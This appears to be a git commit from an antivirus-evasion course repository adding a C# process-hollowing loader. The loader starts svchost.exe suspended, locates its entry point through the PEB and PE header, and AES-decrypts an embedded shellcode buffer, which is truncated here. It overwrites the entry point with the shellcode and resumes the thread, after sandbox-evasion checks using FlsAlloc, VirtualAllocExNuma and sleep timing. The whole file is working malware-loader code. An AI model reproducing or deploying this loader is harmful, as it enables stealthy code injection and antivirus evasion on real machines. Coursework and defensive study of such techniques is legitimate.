9025d9a4e88c1b098bb452697d075538e5ee0fdd
hualin999 <hehehualin99@gmail.com>
2024-01-22 17:06:51 +0800

    6.8.3. Extra Mile Process Hollowing

---
+++ 6.Introduction_to_Antivirus_Evasion/6.8.3_Obfuscating_VBA/Extra_Mile(Process_Hollowing).cs
@@ -0,0 +1,183 @@
+using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Threading;
+using System.Runtime.InteropServices;
+using System.IO;
+using System.Diagnostics;
+using System.Security.Cryptography;
+using System.Net;
+
+namespace Process_Hollowing_SSR
+{
+    class Program
+    {
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
+        struct STARTUPINFO
+        {
+            public Int32 cb;
+            public IntPtr lpReserved;
+            public IntPtr lpDesktop;
+            public IntPtr lpTitle;
+            public Int32 dwX;
+            public Int32 dwY;
+            public Int32 dwXSize;
+            public Int32 dwYSize;
+            public Int32 dwXCountChars;
+            public Int32 dwYCountChars;
+            public Int32 dwFillAttribute;
+            public Int32 dwFlags;
+            public Int16 wShowWindow;
+            public Int16 cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        internal struct PROCESS_BASIC_INFORMATION
+        {
+            public IntPtr Reserved1;
+            public IntPtr PebAddress;
+            public IntPtr Reserved2;
+            public IntPtr Reserved3;
+            public IntPtr UniquePid;
+            public IntPtr MoreReserved;
+        }
+
+        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
+        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
+
+        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
+        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);
+
+        [DllImport("kernel32.dll")]
+        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern uint ResumeThread(IntPtr hThread);
+
+        [DllImport("kernel32.dll")]
+        static extern void Sleep(uint dwMilliseconds);
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetCurrentProcess();
+
+        [DllImport("kernel32.dll")]
+        static extern UInt32 FlsAlloc(IntPtr lpCallback);
+
+        static void Main(string[] args)
+        {
+            UInt32 result = FlsAlloc(IntPtr.Zero);
+            if (result != 0xFFFFFFFF)
+            {
+                IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x40, 0);
+                if (mem == null)
+                {
+                    return;
+                }
+
+                DateTime t1 = DateTime.Now;
+                Sleep(2000);
+                double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
+                if (t2 < 1.5)
+                {
+                    return;
+                }
+
+                STARTUPINFO si = new STARTUPINFO();
+                PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+
+                bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
+                PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
+                uint tmp = 0;
+                IntPtr hProcess = pi.hProcess;
+                ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);
+
+                IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
+                byte[] addrBuf = new byte[IntPtr.Size];
+                IntPtr nRead = IntPtr.Zero;
+                ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
+
+                IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));
+
+                byte[] data = new byte[0x200];
+                ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);
+
+                uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
+
+                uint opthdr = e_lfanew_offset + 0x28;
+
+                uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
+
+                IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
+
+                byte[] Key = Convert.FromBase64String("AAECAwQFBgcICQoLDA0ODw==");
+                byte[] IV = Convert.FromBase64String("AAECAwQFBgcICQoLDA0ODw==");
+
+                // Copy AES-Encrypted Shellcode Here :
+                byte[] buf = new byte[] { 0x2b, 0xc3, 0xb0, 0x19 ... };
+
+                byte[] DShell = AESDecrypt(buf, Key, IV);
+                StringBuilder hexCodes = new StringBuilder(DShell.Length * 2);
+                foreach (byte b in DShell)
+                {
+                    hexCodes.AppendFormat("0x{0:x2},", b);
+                }
+                int size = DShell.Length;
+
+                WriteProcessMemory(hProcess, addressOfEntryPoint, DShell, DShell.Length, out nRead);
+
+                ResumeThread(pi.hThread);
+            }
+        }
+
+        private static byte[] AESDecrypt(byte[] CEncryptedShell, byte[] key, byte[] iv)
+        {
+            using (var aes = Aes.Create())
+            {
+                aes.KeySize = 128;
+                aes.BlockSize = 128;
+                aes.Padding = PaddingMode.PKCS7;
+                aes.Mode = CipherMode.CBC;
+                aes.Key = key;
+                aes.IV = iv;
+
+                using (var decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
+                {
+                    return GetDecrypt(CEncryptedShell, decryptor);
+                }
+            }
+        }
+
+        private static byte[] GetDecrypt(byte[] data, ICryptoTransform cryptoTransform)
+        {
+            using (var ms = new MemoryStream())
+            using (var cryptoStream = new CryptoStream(ms, cryptoTransform, CryptoStreamMode.Write))
+            {
+                cryptoStream.Write(data, 0, data.Length);
+                cryptoStream.FlushFinalBlock();
+
+                return ms.ToArray();
+            }
+        }
+    }
+}
